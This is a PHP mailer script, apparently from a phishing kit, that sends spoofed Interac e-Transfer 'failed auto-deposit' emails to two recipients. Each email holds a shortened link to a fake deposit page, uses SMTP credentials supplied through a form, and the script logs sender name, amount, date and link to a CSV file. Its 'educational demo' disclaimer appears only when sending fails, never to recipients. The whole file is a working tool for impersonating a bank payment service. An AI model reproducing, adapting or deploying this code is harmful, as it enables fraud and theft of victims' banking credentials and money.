<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");

$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

// Email recipients and templates
$recipient1 = $_POST['receivers_email'];

$recipient2 = $_POST['receiver2_email'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

// Email 1

$message1 = file_get_contents('template.html');
$message1 = str_replace('{{etransfer_interac_ca}}', $short_url, $message1);
$message1 = str_replace('{{line}}', $_POST['line'], $message1);
$message1 = str_replace('{{todaysdate}}', $_POST['todaysdate'], $message1);
$message1 = str_replace('{{username}}', $_POST['username'], $message1);
$message1 = str_replace('{{photo_href}}', $_POST['photo_href'], $message1);
$message1 = str_replace('{{bank}}', $_POST['bank'], $message1);
$message1 = str_replace('{{amount}}', $_POST['amount'], $message1);
$message1 = str_replace('{{photo_link}}', $_POST['photo_link'], $message1);
$message1 = str_replace('{{link}}', $_POST['link'], $message1);
$message1 = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message1);
$message1 = str_replace('{{expire}}', $_POST['expire'], $message1);
$message1 = str_replace('{{link}}', $_POST['link'], $message1);
$message1 = str_replace('{{sender_name}}', $_POST['sender_name'], $message1);
$message1 = str_replace('{{receivers_name}}', $_POST['receivers_name'], $message1);
$message1 = str_replace('{{receivers_email}}', $_POST['receivers_email'], $message1);

$mail1 = new PHPMailer();
$mail1->IsSMTP();
$mail1->SMTPSecure = 'tls';
$mail1->Host = $_POST['host'];
$mail1->Port = $_POST['port'];
$mail1->Body = $message1;
$mail1->SMTPAuth = true;
$mail1->Username = $_POST['username'];
$mail1->Password = $_POST['password'];
$mail1->SetFrom('taytayburkeallday@gmail.com', $_POST['sender_name']);
$mail1->AddAddress($recipient1);
$mail1->Subject = 'INTERAC e-Transfer: The money '.$_POST['sender_name'].'sent has Failed to be Auto-deposited.';
$mail1->IsHTML(true);
$mail1->CharSet = "utf-8";

// Email 2
$message2 = file_get_contents('template1.html');
$message2 = str_replace('{{etransfer_interac_ca}}', $short_url, $message2);
$message2 = str_replace('{{line}}', $_POST['line'], $message2);
$message2 = str_replace('{{todaysdate}}', $_POST['todaysdate'], $message2);
$message2 = str_replace('{{username}}', $_POST['username'], $message2);
$message2 = str_replace('{{photo_href}}', $_POST['photo_href'], $message2);
$message2 = str_replace('{{bank}}', $_POST['bank'], $message2);
$message2 = str_replace('{{amount}}', $_POST['amount'], $message2);
$message2 = str_replace('{{photo_link}}', $_POST['photo_link'], $message2);
$message2 = str_replace('{{link}}', $_POST['link'], $message2);
$message2 = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message2);
$message2 = str_replace('{{expire}}', $_POST['expire'], $message2);
$message2 = str_replace('{{link}}', $_POST['link'], $message2);
$message2 = str_replace('{{sender_name}}', $_POST['sender_name'], $message2);
$message2 = str_replace('{{receivers_name}}', $_POST['receivers_name'], $message2);
$message2 = str_replace('{{receivers_email}}', $_POST['receivers_email'], $message2);

$mail2 = new PHPMailer();
$mail2->IsSMTP();
$mail2->SMTPSecure = 'tls';
$mail2->Host = $_POST['host'];
$mail2->Port = $_POST['port'];
$mail2->Body = $message2;
$mail2->SMTPAuth = true;
$mail2->Username = $_POST['username'];
$mail2->Password = $_POST['password'];
$mail2->SetFrom('taytayburkeallday@gmail.com', $_POST['sender_name']);
$mail2->AddAddress($recipient2);
$mail2->Subject = 'INTERAC e-Transfer: The money '.$_POST['sender_name'].'sent haas Failed to be Auto-deposited.';
$mail2->IsHTML(true);
$mail2->CharSet = "utf-8";

if (!$mail1->Send() || !$mail2->Send()) {
    echo "THIS IS NOT THE OFFICIAL INTERAC WEBSITE. THIS IS AN EDUCATIONAL DEMO";
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}


ob_end_clean(); // Clear output buffer

header("Location: ../../start.php"); // Redirect after clearing output buffer
exit();
?>